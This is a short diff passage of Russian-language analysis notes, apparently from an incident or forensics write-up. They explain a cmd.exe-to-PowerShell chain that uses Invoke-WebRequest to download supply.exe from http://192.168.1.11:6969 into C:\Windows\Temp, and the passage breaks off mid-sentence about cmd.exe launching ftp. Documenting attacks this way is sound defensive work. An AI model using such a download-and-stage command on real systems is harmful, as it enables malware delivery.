@@ -63,3 +63,4 @@ cmd.exe запускает powershell с командой powershell -c INvoke-W
 - **`Invoke-WebRequest`** — команда PowerShell, которая отправляет веб-запрос и получает ответ сервера.
 - **`-Uri`** — параметр, задающий адрес запроса. `http://192.168.1.11:6969/supply.exe`
 Сохранение ответа в C:\Windows\Temp\supply.exe.
+![](attachment/Pasted%20image%2020261114160347.png)cmd. exe запустил ftp, тот в свою очередь 
